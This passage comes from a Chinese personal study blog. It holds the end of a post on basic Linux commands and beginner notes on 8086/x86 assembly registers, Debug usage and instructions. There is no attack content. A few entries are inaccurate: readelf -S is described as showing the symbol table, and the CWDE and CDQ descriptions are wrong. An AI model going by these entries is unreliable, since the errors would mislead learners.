粘贴<br><br></code></pre></td></tr></table></figure>

<h4 id="二、常见指令"><a href="#二、常见指令" class="headerlink" title="二、常见指令"></a>二、常见指令</h4><table>
<thead>
<tr>
<th>指令</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>ls</td>
<td>用来显示目标列表</td>
</tr>
<tr>
<td>cd 文件名</td>
<td>切换进入到某个文件中（可进入下级目录，也可以据此返回上级目录）</td>
</tr>
<tr>
<td>pwd</td>
<td>以绝对路径的方式显示用户当前工作目录</td>
</tr>
<tr>
<td>man  command</td>
<td>查看Linux中的指令帮助、配置文件帮助和编程帮助等信息</td>
</tr>
<tr>
<td>apropos whatever</td>
<td>在一些特定的包含系统命令的简短描述的数据库文件里查找关键字</td>
</tr>
<tr>
<td>echo  string</td>
<td>打印一行文本，参数“-e”可激活转义字符</td>
</tr>
<tr>
<td>cat  file</td>
<td>输出文件的内容</td>
</tr>
<tr>
<td>more/less [file]</td>
<td>允许用户向前或向后浏览文字档案的内容</td>
</tr>
<tr>
<td>mv [file1] [file2]</td>
<td>把file1里的内容移动到file2里，<strong>并且覆盖file2原有内容以及删除file1</strong> （所以可以用来更名）</td>
</tr>
<tr>
<td>cp [file1] [file2]</td>
<td>把file1里的内容复制到file2中，<strong>并且覆盖file2原有的内容</strong></td>
</tr>
<tr>
<td>rm [file]</td>
<td>删除文件file</td>
</tr>
<tr>
<td>ps</td>
<td>用于报告当前系统的进程状态</td>
</tr>
<tr>
<td>top</td>
<td><strong>实时查看</strong>系统的整体运行情况</td>
</tr>
<tr>
<td>kill</td>
<td>杀死一个进程</td>
</tr>
<tr>
<td>ifconfig</td>
<td>查看或设置网络设备</td>
</tr>
<tr>
<td>ping 目标地址</td>
<td>查看网络上的主机是否工作</td>
</tr>
<tr>
<td>netstat</td>
<td>显示网络连接、路由表和网络端口信息</td>
</tr>
<tr>
<td>nc ip地址 ip端口</td>
<td>建立 TCP 和 UDP 连接并监听（连接一个IP地址）</td>
</tr>
<tr>
<td>su</td>
<td>切换当前用户身份到其他用户身份</td>
</tr>
<tr>
<td>touch 文件名</td>
<td>创建新的<strong>空文件</strong> （如果未进入任何目录下进行创建，新文件夹会在主文件夹里面）</td>
</tr>
<tr>
<td>mkdir 目录名</td>
<td>创建目录 （目录的位置同上）</td>
</tr>
<tr>
<td>chmod</td>
<td>变更文件或目录的权限</td>
</tr>
<tr>
<td>chown</td>
<td>变更某个文件或目录的所有者和所属组</td>
</tr>
<tr>
<td>nano / vim/emacs（vim中q不保存退出，wq保存后退出，i可修改编辑文本，ESC结束某个状态）</td>
<td>字符终端的文本编辑器</td>
</tr>
<tr>
<td>exit</td>
<td>退出 shell</td>
</tr>
<tr>
<td>file 文件</td>
<td>查看文件属性信息</td>
</tr>
<tr>
<td>cd ..</td>
<td>返回上一级目录</td>
</tr>
<tr>
<td>cd –</td>
<td>返回到最开始进入shell的目录下</td>
</tr>
<tr>
<td>ldd elf文件</td>
<td>查看该elf文件的libc和ld</td>
</tr>
<tr>
<td>whoami</td>
<td>打印用户名</td>
</tr>
<tr>
<td>uname</td>
<td>打印系统信息</td>
</tr>
<tr>
<td>cat 文件1 &gt;&gt; 文件2</td>
<td>把文件1内容复制到文件2内容的后面</td>
</tr>
<tr>
<td>/</td>
<td>根目录</td>
</tr>
<tr>
<td>/*</td>
<td>根目录下所有文件</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>指令ls -al可查看的信息：（如果为ls -l则显示ls可查看的文件的以下详细资料，或者ls -l 文件名可以只查看该文件的信息）</p>
<p>1.第一列表示文件的属性：</p>
<p>【d】，则是目录</p>
<p>【-】，则是文件</p>
<p>【l】，则表示为链接文件（link file）</p>
<p>【b】，则表示为设备文件中可供存储的接口设备</p>
<p>【c】，则表示为设备文件中的串行端口设备，例如键盘、鼠标。</p>
<p>#接下来的属性中，3个为一组，且均为“rwx”3个参数组合。其中r表示可读read，w表示可写write，x表示可执行excute。</p>
<p>第一组为“拥有者的权限（root权限）”，第二组为“同用户组的权限”，第三组为“其他非本用户组的权限”。</p>
<p>2、第二列表示连接占用的节点（i-node）</p>
<p>3、第三列表示这个文件或目录的“拥有者”</p>
<p>4、第四列表示拥有者的用户组</p>
<p>5、第五列为这个文件的大小</p>
<p>6、第六列为这个文件的创建日期或者是最近的修改日期</p>
<p>7、第七列为这个文件的文件名：如果文件名前面有.说明是隐藏文件。如果只输入ls 前面加.的文件不会显示出来。ls -al则会显示出全部文件。</p>
<h4 id="readelf指令"><a href="#readelf指令" class="headerlink" title="readelf指令"></a>readelf指令</h4><p>1、readelf -h 文件名  查看文件的头部信息</p>
<p>2、readelf -S 文件名  查看文件符号表</p>
<h3 id="三、一些常识"><a href="#三、一些常识" class="headerlink" title="三、一些常识"></a>三、一些常识</h3><p>1、在Linux中，shell中执行可执行文件时要写成如**./mycat** 的格式，因为在Linux系统里，系统只会搜索环境变量path中去寻找，加个***./*** 是告诉系统去当前目录下去寻找</p>
<p>2、chmod 754 文件名，用来给文件权限进行划分，其中r为4，w为2，x为1</p>
<p>3、一个特殊符号：管道命令符 “|” 功能为：将在管道命令符|左边命令的标准输出作为右边命令的标准输入 </p>
<p>4、Linux系统中用户的用户名以及密码保存在/etc/shadow中</p>
<p>5、.bash_history里面存储着指令执行的历史记录，对应权限查看对应权限执行的命令；直接输入<code>history n </code>  也可以查看最近执行的n条命令记录，<code>history -c</code>清空命令记录</p>
<p>6、grep 的作用是查找相关字符 </p>
]]></content>
  </entry>
  <entry>
    <title>勇闯汇编——随手记</title>
    <url>/2020/10/17/2020-10-17-%E5%8B%87%E9%97%AF%E6%B1%87%E7%BC%96%E2%80%94%E2%80%94%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h5 id="学习书籍为《汇编语言》（第二版）"><a href="#学习书籍为《汇编语言》（第二版）" class="headerlink" title="学习书籍为《汇编语言》（第二版）"></a>学习书籍为《汇编语言》（第二版）</h5><p>汇编语言是一种为了方便程序员记忆，查看，纠错而设计的一种语言，计算机是无法直接执行的，必须由编译器将汇编语言转化成相应的机器指令（二进制）才能被计算机所执行。</p>
<p>1、CPU想读写一个存储器芯片的某个单元里面的数据时，要有三步骤，第一，先要知道该存储单元的具体位置（通过地址线）；第二，向控制存储器芯片传达读写指令（通过控制线）；第三，将数据读出或者写入该存储单元（通过数据线）</p>
<p>2、当一个CPU地址总线宽度为n（CPU有n根地址线，每根导线可以传送的稳定状态只有两种，高电平与低电平，可以用0或1代替记忆）最多可以寻找到2的n次方个的存储单元，数据线同理，将传输出2的n次方个数据。而控制线则是有多少根就代表有CPU对外部器件有多少种控制。</p>
<p>3、一个存储单元（一个字节）可以存储八个位（bit），存储单元从0开始编号</p>
<p>4、存储器芯片从读写属性上分为两类：随机存储器（RAM）和只读存储器（ROM）。RAM可读可写，但必须带电存储，关机后存储内容丢失；ROM只能读取，不能写入，关机后其中的内容不丢失。</p>
<p>5、BIOS（Basic Input/Output System,基本写入/写出系统）可通过它利用硬件设备进行最基本的输入输出</p>
<p>6、内存地址空间：（个人理解）CPU所能找寻的地址范围内的所有的存储器集合起来的整个空间叫做内存地址空间，而不同的存储器构成的是更小的地址空间</p>
<p>7、一个CPU通常由运算器（处理信息）、控制器（控制各种器件进行工作）、寄存器（存储信息）等器件构成，器件间通过CPU内部的总线相连。</p>
<p>8、汇编程序员通过改变寄存器中的内容来调动CPU进行各项工作</p>
<p>9、在写汇编指令或者寄存器名称时不区分大小写</p>
<p>10、所有内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间中都有唯一的地址，而这个地址被称为物理地址。</p>
<p>11、8086CPU为16位结构，而地址总线达到了20位，此时采用将两个16位地址合成为一个20位地址，通过地址加法器：物理地址=基础地址（段地址*16）+偏移地址</p>
<p>12、一个x进制的数据左移1位，相当于乘以x</p>
<p>13、CS:IP指向的内存单元中的内容将会被CPU当做指令执行（CS中保存指令的段地址，IP保存偏移地址），用CS,IP合成的物理地址，去内存中读取指令码程序员通过改变寄存器的内容实现对CPU的控制，所以改变CS,IP可以控制CPU执行目标指令</p>
<p>14、可用<strong>jmp 段地址:偏移地址</strong>修改CS:IP的指令；jmp后跟着的地址成为CS与IP中的内容；如果写成<strong>jmp 某寄存器</strong>就是用该寄存器中的值修改IP中的内容；常用的mov指令并不能修改CS、IP的值</p>
<p>15、将一段内存用于存放代码，则就被称为代码段，代码段可以使得只需指向代码段中的第一个指令的物理位置，即可接着执行代码段其余的代码指令</p>
<p>16、实际上在内存中数据和指令并未有区别，都是二进制数！！！</p>
<p>17、如果将AX,BX,CX,DX等如AX拆分成两个八位的寄存器，则AH是高八位，AL是低八位</p>
<p>18、字(word)：由两个字节组成，这两个字节分为高位字节和低位字节。还有dword是由双字（四个字节）组成，qword由四字组成</p>
<p>19、传输数据或运算时，需要注意寄存器所能存储的位数大小，是否会比所传输数据小，如果比传输数据小，将只能保存该寄存器所能保存的最多位数，高位数据将不能被保存进寄存器，并且需要注意的是，正常的指令是不能在存储大小不同的寄存器间进行操作，例如：mov bx,al是错误的指令</p>
<p>另：但是在现在的x64架构下，有mov的变式movzx确是可以进行把存储在位数小的寄存器中的值拷贝到位数大的寄存器中：movzx bx,al</p>
<p>20、[address]表示一个内存单元，address表示内存单元的偏移地址，段地址则存在相应的段寄存器中。例如数据段的段地址存储在寄存器ds中</p>
<p>另：</p>
<p>（1）只有在debug中才能直接写成[address]，如果在汇编源程序编写，前面要加上段寄存器， 如ds:[address]（但是这只是在address为常数是适用，如果用寄存器进行表示时，系统默认段地址在ds中，如果想使用其他段寄存器则需要显式的说明）</p>
<p>（2）address处还可以填写通用寄存器，表示偏移地址是存储在该寄存器中的。比如[bx]说明bx中存储的内容作为偏移地址</p>
<p>21、不能用mov指令直接把数据传入段寄存器，要通过使用通用寄存器进行一次中转才行；或者也可以把内存单元的内容传入段寄存器中。段寄存器的内容传入其他的地方均可</p>
<p>另：sub，add等指令不能对段寄存器进行运算，会报错</p>
<p>22、mov一次能传输的数据的位数由寄存器的大小决定，如al，则传输一个内存单元（一个字节）的内容；如ax则传输两个内存单元（一个字）的内容</p>
<p>23、栈：是一种具有特殊访问方式的存储空间。操作规则：最后进栈的数据，最先出去。并且栈顶是从高地址向低地址增长。</p>
<p>push：入栈。例如：push ax表示把寄存器ax中的数据送入栈中</p>
<p>pop：出栈。例如：pop ax表示从栈顶取出数据送入寄存器ax    </p>
<p>在8086CPU中段寄存器SS和寄存器SP用来存放栈顶的地址，段地址放在SS中，偏移地址放在SP中。任意时刻SS:SP都指向栈顶元素。当栈空时，指向栈中最高地址的下一个地址，例如栈最高地址为1000FH，那么SS:SP指向10010H</p>
<p>8086CPU的出入栈都是以字为单位进行的（所以每次SP进行指向栈顶，数据入栈则减2；数据出栈则加2）但是栈中数据依旧是一个内存单元存储一个字节的内容</p>
<p>8086CPU只有使用SS:SP指向栈顶的位置，并未使用其他寄存器进行检验栈空间是否达到上限而造成栈越界（栈溢出）覆盖别的内存单元</p>
<p>push与pop指令操作对象不仅限于寄存器，也可以用于操作段寄存器、内存单元。</p>
<p>24、内存空间中本来所有的存储单元都是一致的，所谓的各种分段的概念，是因为程序员将之进行划分，而若是CPU本身是无法分辨我们所谓的段。只能通过相应的寄存器来告诉CPU，某些寄存器指向的内容要做相应的处理，才能执行我们想要的段的概念划分</p>
<p>25、在Debug中T命令在执行修改段寄存器SS的指令时，并不会停止，而是把下一条指令也执行了</p>
<p>26、链接：</p>
<p>（1）当源程序很大时，将之分为多个源程序文件进行编译，每个源程序编译完成为目标文件后，再用链接程序将他们连在一起，生成可执行文件</p>
<p>（2）如果程序调用了某个库文件中的子程序，需要将库文件和目标文件链接在一起，生成可执行文件</p>
<p>（3）源程序编译后，得到了存有机器码的目标文件，但是目标文件中的有些内容还不能直接用来生成可执行文件，而链接程序可以处理这些内容，将之变为可执行的，才能使目标文件变为可执行文件</p>
<p>27、DOS系统中.exe文件的加载时，在某段足够长的内存区会先创建一个称为程序段前缀（PSP）的数据区，DOS利用PSP来和被加载程序进行通信，PSP长度为256字节（0~255）。在其之后的才是程序   （了解即可）</p>
<p>28、inc指令是加一的意思，如mov bx,1   inc bx  那么bx==2</p>
<p>29、汇编中一个标号（为某个字母）表示一个地址</p>
<p>30、loop指令</p>
<ul>
<li><p>loop 标号：循环执行标号指向地址内的内容（一般为指令）</p>
</li>
<li><p>标号标识的地址要在loop指令前面</p>
</li>
<li><p>一般在cx中保存着loop循环次数，执行循环前，要先把存储在cx中循环次数减1，不为0时再执行loop指令进行循环；直到cx值为0时停止循环，执行下一条指令</p>
</li>
</ul>
<p>31、在汇编源程序中不能以字母作为数据的开头，若是数据的第一位是字母，那么要在前面加个0才行</p>
<p>32、段前缀：在偏移地址前面显式的用“ds:，cs:，ss:，es:”指明内存单元的段地址</p>
<p>33、DOS方式下，DOS和其他合法程序一般都不会使用0:200~0:2ff的256个字节的空间</p>
<p>34、表明一个内存单元可以用如[bx+200]这样的形式，表示偏移地址为bx中的数值加上200</p>
<p>也可以写为200[bx] （这与C语言中的数组形式很像，假设把200看作起始地址，bx看作循环的i）或者[bx].200</p>
<p>35、在8086CPU和x86下si和di的功能与bx相近，但是si和di不能被拆分成两个8位的寄存器</p>
<p>36、si或di可以与如bx这样使用[bx+si]或者[bx] [si]，两者作用一致为：偏移地址等于si中的值加上bx中的值。</p>
<p>还有这样的形式：[bx+si+data] (data是一个具体的数值) 假设data为200；</p>
<p>即为[bx+si+200] 或是200 [bx] [si] ，[bx].200[si] ，[bx] [si].200</p>
<p>37、一般来说，在需要暂存数据的时候，我们都使用栈来保存数据。因为寄存器的数量少。</p>
<p>38、在8086CPU中只有bx，bp，si，di可以使用如[bx]的形式来进行内存单元的寻址，但是以bx和bp为主。这两个寄存器不可以同时出现在[…]里面，因为在指令中如果没有显性的给出段地址，那么bx与ds相关联，而bp与ss相关联。</p>
<p>39、</p>
<hr>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="x86构架下"><a href="#x86构架下" class="headerlink" title="x86构架下"></a>x86构架下</h4><p><img src="/2020/10/17/2020-10-17-%E5%8B%87%E9%97%AF%E6%B1%87%E7%BC%96%E2%80%94%E2%80%94%E7%AC%94%E8%AE%B0/%E5%AF%84%E5%AD%98%E5%99%A8.jpg"></p>
<p>（图片来源于安全客，水印上也有哈~）</p>
<p>32位x86架构下的寄存器可以被简单分为<strong>通用寄存器</strong>和<strong>特殊寄存器</strong>两类，通用寄存器在大部分汇编指令下是可以任意使用的（虽然有些指令规定了某些寄存器的特定用途），而特殊寄存器只能被特定的汇编指令使用，不能用来任意存储数据。</p>
<p>通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi），以及堆栈指针寄存器（esp、ebp）</p>
<p>eax 被称为累加寄存器（<strong>A</strong>ccumulator），用以进行算数运算和返回函数结果等。ebx 被称为基址寄存器（<strong>B</strong>ase），在内存寻址时（比如数组运算）用以存放基地址。ecx 被称为记数寄存器（<strong>C</strong>ounter），用以在循环过程中记数。edx 被称为数据寄存器（<strong>D</strong>ata），常配合 eax 一起存放运算结果等数据。</p>
<p>​    索引寄存器通常用于字符串操作中，esi 指向要处理的数据地址（<strong>S</strong>ource <strong>I</strong>ndex），edi 指向存放处理结果的数据地址（<strong>D</strong>estination <strong>I</strong>ndex）。</p>
<p>​    堆栈指针寄存器（esp、ebp）用于保存函数在调用栈中的状态</p>
<p>特殊寄存器包括段地址寄存器（ss、cs、ds、es、fs、gs），标志位寄存器（EFLAGS），以及指令指针寄存器（eip）</p>
<p>段地址寄存器就是用来存储内存分段地址的，其中寄存器 ss 存储函数调用栈（<strong>S</strong>tack <strong>S</strong>egment）的地址，寄存器 cs 存储代码段（<strong>C</strong>ode <strong>S</strong>egment）的地址，寄存器 ds 存储数据段（<strong>D</strong>ata <strong>S</strong>egment）的地址，es、fs、gs 是附加的存储数据段地址的寄存器。</p>
<p>标志位寄存器（EFLAGS）32位中的大部分被用于标志数据或程序的状态，例如 OF（<strong>O</strong>verflow <strong>F</strong>lag）对应数值溢出、IF（<strong>I</strong>nterrupt <strong>F</strong>lag）对应中断、ZF（<strong>Z</strong>ero <strong>F</strong>lag）对应运算结果为0、CF（<strong>C</strong>arry <strong>F</strong>lag）对应运算产生进位等等。</p>
<p>​    指令指针寄存器（eip）存储下一条运行指令的地址</p>
<p>参考：</p>
<p>64位系统中函数传参使用的寄存器顺序是RDI,RSI,RDX,RCX,R8,R9之后才是使用栈进行存储参数</p>
<h2 id="指令（工具-debug，具体配置可参考百度）"><a href="#指令（工具-debug，具体配置可参考百度）" class="headerlink" title="指令（工具:debug，具体配置可参考百度）"></a>指令（工具:debug，具体配置可参考百度）</h2><p>一、Debug使用</p>
<p>1、(常用指令)R查看、改变CPU寄存器的内容；</p>
<p>D查看内存中的内容；（d 段地址:偏移地址 可以查看从该指向地址起的128个存储单元，若在其后继续输入d，将沿着顺序查看剩下的存储单元，若只想查看单个，则在命令后面在加上偏移地址）</p>
<p><strong>E 段地址:偏移地址</strong> （ 改写内存中的内容）后有两种方法：</p>
<p>（1）是直接在后面加上修改的字母或数字</p>
<p>（2）是回车键后，再填写修改的字母或者数字，使用此方法时如果直接输入空格表示不对某个数据做出修改</p>
<p><strong>注：也可以通过以上方式将机器码（有对应的汇编指令的机器码）直接写入存储单元</strong></p>
<p>U指令：<strong>U 段地址:偏移地址</strong> 可以查看从指向的物理地址作为起始的一些内存中的机器指令，并将内存中的机器指令翻译成汇编指令；</p>
<p>T指令：执行一条机器指令（在输入t指令前，需要先把CS:IP指向的物理地址改为你要执行的物理地址，然后再输入t，执行一条机器指令）；</p>
<p>A指令： <strong>A 段地址:偏移地址</strong> 可以以汇编指令的格式在内存中写入机器指令，不必像E指令输入机器码，更加简单方便</p>
<p>P指令：用来在int 21h处执行，表示程序执行完成，程序返回到最初调用程序的地方；也可以用在loop循环前，让程序自动执行循环直至cx中的循环次数为0</p>
<p>g指令：在debug上调试程序时，<strong>g 偏移地址</strong>可以让程序自动执行到该处的程序地址才停止，并省略中间过程，直接展示执行到该处的运行结果</p>
<p>另：所有填写段地址的地方可以填写段寄存器，表示要对该段寄存器加偏移地址所指向的地址进行操作</p>
<p>二、伪指令</p>
<p>1、assume：假设。假设某一段寄存器和程序中某一个用segment…ends定义的段相关联。编程时要记得用assume将有特定用途的段和相关的段寄存器关联起来即可</p>
<p>2、段名 segment</p>
<p>​            …</p>
<p>​      段名 ends  这两个的组合的是定义一个段，段名 segment说明一个段的开始，段名 ends说明一个段的结束</p>
<p>3、end：是一个汇编程序结束的标记。当编译器在编译汇编程序的过程中，碰到伪指令end就结束对源程序的编译。注意与ends的区分。end是整个汇编程序的结束，而ends只是一个定义段的结束</p>
<p>4、MOV AX,4C00H（或者MOV AH,4CH）INT 21H    可以使得程序返回，在debug中调试时，该指令要用p指令运行</p>
<p>5、编写源程序时dw即define word ，定义字类型的数据。并且数据将会被存放在以cs:0作为开始的内存单元</p>
<p>6、编写源程序时，如果有其他的段或数据需要指定，那么就必须要在真正运行的指令前加上<strong>start:</strong> 同时原本的end也要改成end start</p>
<p>7、编写源程序时，可以定义多个段，每个我们自己定义的段名代表着这个段的段地址</p>
<h3 id="数据传送指令（来自百度百科）"><a href="#数据传送指令（来自百度百科）" class="headerlink" title="数据传送指令（来自百度百科）"></a>数据传送指令（来自百度百科）</h3><p>MOV：传送字或字节。</p>
<p>MOVSX：先符号扩展，再传送。</p>
<p>MOVZX：先零扩展，再传送。</p>
<p>PUSH：把字压入堆栈。</p>
<p>POP： 把字弹出堆栈。</p>
<p>PUSHA： 把AX，CX，DX，BX，SP，BP，SI，DI依次压入堆栈。</p>
<p>POPA： 把DI，SI，BP，SP，BX，DX，CX，AX依次弹出堆栈。</p>
<p>PUSHAD： 把EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI依次压入<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p>
<p>POPAD： 把EDI，ESI，EBP，ESP，EBX，EDX，ECX，EAX依次弹出<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p>
<p>BSWAP： 交换32位寄存器里字节的顺序。</p>
<p>XCHG： 交换字或字节。( 至少有一个<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>为寄存器,<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>不可作为操作数)</p>
<p>CMPXCHG： 比较并交换<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>。（第二个操作数必须为<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>AL/AX/EAX）</p>
<p>XADD： 先交换再累加。( 结果在第一个<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>里 )</p>
<p>XLAT： 字节查表转换── BX 指向一张 256 字节的表的起点，AL 为表的索引值（0-255，即0-FFH）； 返回 AL 为查表结果 （ [BX+AL]-&gt;AL）</p>
<p>Enter的作用相当==push ebp和mov ebp,esp</p>
<p>Leave的作用相当==mov esp,ebp和pop ebp</p>
<h3 id="输入输出端口传送指令"><a href="#输入输出端口传送指令" class="headerlink" title="输入输出端口传送指令"></a>输入输出端口传送指令</h3><p>IN： I/O端口输入。（ 语法：IN <a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>，{<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7">端口号</a>│DX} ）</p>
<p>OUT： I/O端口输出. （语法：OUT {端口号│DX}，<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>）输入输出端口由立即方式指定时，其范围是 0-255；由寄存器DX 指定时，其范围是 0-65535。 [6] </p>
<h3 id="目的地址传送指令"><a href="#目的地址传送指令" class="headerlink" title="目的地址传送指令"></a>目的地址传送指令</h3><p>LEA： 装入<a href="https://baike.baidu.com/item/%E6%9C%89%E6%95%88%E5%9C%B0%E5%9D%80">有效地址</a>。例：LEA DX，string；把<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到DX。</p>
<p>LDS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入DS。例： LDS SI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到DS：SI。</p>
<p>LES： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入ES。例： LES DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到ES：DI。</p>
<p>LFS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入FS。例： LFS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到FS：DI。</p>
<p>LGS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入GS。例： LGS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到GS：DI。</p>
<p>LSS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入SS。例： LSS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到SS：DI。</p>
<h3 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h3><p>LAHF：标志寄存器传送，把标志装入AH。</p>
<p>SAHF： <a href="https://baike.baidu.com/item/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">标志寄存器</a>传送，把AH内容装入标志寄存器。</p>
<p>PUSHF： 标志<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">入栈</a>。</p>
<p>POPF： 标志<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">出栈</a>。</p>
<p>PUSHD： 32位标志<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">入栈</a>。</p>
<p>POPD： 32位标志<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">出栈</a>。</p>
<h2 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h2><p>算数运算类指令包括加减乘除、比较与调整指令。它们可进行8位、16位和32位的运算。参加运算的操作数可以说二进制数和十进制数（BCD码），这些数可以是无符号数，也可以是带符号数。算术运算指令的主要特点是执行结果影响标志寄存器的状态标志位OF、SF、ZF、AF、PF、CF。</p>
<p>ADD： 加法。</p>
<p>ADC： 带进位加法。</p>
<p>INC： 加 1。</p>
<p>AAA： 加法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p>
<p>DAA： 加法的十进制调整。</p>
<p>SUB： 减法。</p>
<p>SBB： 带借位减法。</p>
<p>DEC： 减 1。</p>
<p>NEG： 取补。</p>
<p>CMP： 比较。（两<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>作减法，仅修改标志位，不回送结果）</p>
<p>AAS： 减法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p>
<p>DAS： 减法的十进制调整。</p>
<p>MUL： 无符号乘法。结果回送AH和AL（字节运算），或DX和AX（字运算）</p>
<p>IMUL： 整数乘法。结果回送AH和AL（字节运算），或DX和AX（字运算）</p>
<p>AAM： 乘法的ASCII码调整。</p>
<p>DIV： 无符号除法：商回送AL，余数回送AH，（字节运算）；或商回送AX，余数回送DX（字运算）</p>
<p>IDIV： 整数除法：商回送AL，余数回送AH，（字节运算）；或商回送AX，余数回送DX（字运算）</p>
<p>AAD： 除法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p>
<p>CBW： 字节转换为字。（把AL中字节的符号扩展到AH中去）</p>
<p>CWD： 字转换为双字。（把AX中的字的符号扩展到DX中去）</p>
<p>CWDE：双字转换为四字。 （把AX中的字符号扩展到EAX中去）</p>
<p>CDQ： 双<a href="https://baike.baidu.com/item/%E5%AD%97%E6%89%A9%E5%B1%95">字扩展</a>。（把EAX中的字的符号扩展到EDX中去）</p>
<h2 id="逻辑运算类指令"><a href="#逻辑运算类指令" class="headerlink" title="逻辑运算类指令"></a>逻辑运算类指令</h2><p>逻辑运算类指令分为逻辑运算指令和移位指令两大类。</p>
<h3 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h3><p>AND： 与运算。</p>
<p>OR： 或运算。</p>
<p>XOR： 异或运算。</p>
<p>NOT： 取反。</p>
<p>TEST： 测试。（两操作数作与运算，仅修改标志位，不回送结果）</p>
<h3 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h3><p>SHL： 逻辑左移。</p>
<p>SAL： 算术左移。(=SHL)</p>
<p>SHR： 逻辑右移。（每位右移，低位进 CF，高位补 0）</p>
<p>SAR： 算术右移。（每位右移， 低位进 CF，高位不变）</p>
<p>ROL： 循环左移。</p>
<p>ROR： 循环右移。</p>
<p>RCL： 通过进位的循环左移。</p>
<p>RCR： 通过进位的循环右移。</p>
<p>以上八种移位指令，其移位次数可达255次。</p>
<p>移位一次时，可直接用<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%A0%81">操作码</a>，如：SHL AX，1；移位&gt;1次时，则由寄存器CL给出移位次数，如：MOV CL，04；SHL AX，CL。</p>
<h2 id="串操作指令"><a href="#串操作指令" class="headerlink" title="串操作指令"></a>串操作指令</h2><p>串操作指令用于处理存放在存储器中的数据串，有串传送、串比较、串扫描、串装入、串存储。其中，仅有串比较和串扫描指令对标志位OF、SF、ZF、AF、PF、CF有影响。 [4] </p>
<p>DS：SI ——源串<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>：源串<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">变址</a>。</p>
<p>ES：DI ——目标串<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>：目标串<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">变址</a>。</p>
<p>CX： 重复次数计数器。</p>
<p>AL/AX： 扫描值。</p>
<p>D标志： 0表示重复操作中SI和DI应自动增量；1表示应自动减量。</p>
<p>Z标志： 用来控制扫描或比较操作的结束。</p>
<p>MOVS： 串传送。（MOVSB 传送字符， MOVSW 传送字， MOVSD 传送双字）</p>
<p>CMPS： 串比较。（CMPSB 比较字符， CMPSW 比较字）</p>
